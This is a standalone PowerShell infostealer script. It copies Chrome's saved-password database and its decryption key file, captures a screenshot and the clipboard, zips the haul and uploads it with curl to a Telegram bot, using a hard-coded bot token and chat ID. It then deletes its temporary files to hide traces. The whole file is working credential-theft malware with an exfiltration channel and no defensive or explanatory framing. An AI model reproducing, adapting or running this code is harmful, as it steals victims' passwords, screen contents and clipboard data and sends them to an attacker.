[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"

$workDir = "$env:TEMP\sys_$(Get-Random)"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

try {
    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    
    if (Test-Path $localState) { Copy-Item $localState -Destination "$workDir\key.json" }
    if (Test-Path $loginData) {
        $stream = [System.IO.File]::Open($loginData, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $out = [System.IO.File]::Create("$workDir\passwords.db")
        $stream.CopyTo($out); $stream.Close(); $out.Close()
    }

    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0,0,0,0,$bmp.Size)
    $bmp.Save("$workDir\screen.png")
    $g.Dispose(); $bmp.Dispose()

    "Clipboard Content: $((Get-Clipboard) -join ' ')" | Out-File "$workDir\info.txt"

    $zipFile = "$env:TEMP\data_$(Get-Random).zip"
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($workDir, $zipFile)

    & curl.exe -s -F "chat_id=$chatId" -F "document=@$zipFile" "https://api.telegram.org/bot$token/sendDocument"

} catch {
    $err = $_.Exception.Message
    & curl.exe -s -d "chat_id=$chatId" -d "text=Fail: $err" "https://api.telegram.org/bot$token/sendMessage"
} finally {
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
}
